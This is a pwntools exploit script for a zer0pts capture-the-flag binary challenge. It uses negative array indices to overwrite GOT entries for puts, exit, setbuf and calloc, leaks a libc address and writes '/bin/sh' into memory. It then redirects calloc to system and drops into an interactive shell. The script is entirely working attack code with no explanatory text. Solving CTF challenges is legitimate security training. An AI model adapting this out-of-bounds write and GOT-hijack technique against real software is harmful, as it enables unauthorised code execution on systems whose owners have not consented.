#!/usr/bin/env python3

from pwn import *

local = 0

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

if local:
    p = process("./chall")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    p = remote("pwn.ctf.zer0pts.com", 9004)
    libc = ELF("./libc.so.6")

e = ELF("./chall")


binsh = 0x0000000000601c00


p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(e.got['puts'] // 4))
p.sendlineafter(" = ", str(e.sym['main']))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(0x601010 // 4))
p.sendlineafter(" = ", str(0x0000000004007D4))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(0x601014 // 4))
p.sendlineafter(" = ", str(0x00000000))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(e.got['exit'] // 4))
p.sendlineafter(" = ", str(e.sym['setup']))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(e.got['setbuf'] // 4))
p.sendlineafter(" = ", str(0x4005d0))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str((e.got['setbuf']+4) // 4))
p.sendlineafter(" = ", str(0))

if local:
    gdb.attach(p, gdbscript="")

p.sendlineafter("n = ", "1000")
p.recvuntil('arr[')
lolibc_addr= int(p.recvuntil(']')[:-1]) & 0xffffffff

lolibc_addr = lolibc_addr - libc.sym["_IO_2_1_stdin_"]

p.sendline("-")

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(binsh // 4))
p.sendlineafter(" = ", str(int.from_bytes(b'/bin', 'little')))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str((binsh+4) // 4))
p.sendlineafter(" = ", str(int.from_bytes(b'/sh\0', 'little')))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(0x601010 // 4))
p.sendlineafter(" = ", str(0x00000000040079c))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(0x601014 // 4))
p.sendlineafter(" = ", str(0x00000000))

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(e.got['exit'] // 4))
p.sendlineafter(" = ", str(0x00000000004005d0))  # mov rdi, rax ; call calloc

p.sendlineafter("n = ", "-1")
p.sendlineafter("i = ", str(e.got['calloc'] // 4))
p.sendlineafter(" = ", str(lolibc_addr + libc.sym['system']))

p.sendlineafter("n = ", str(binsh))

context.log_level = 'info'
p.interactive()
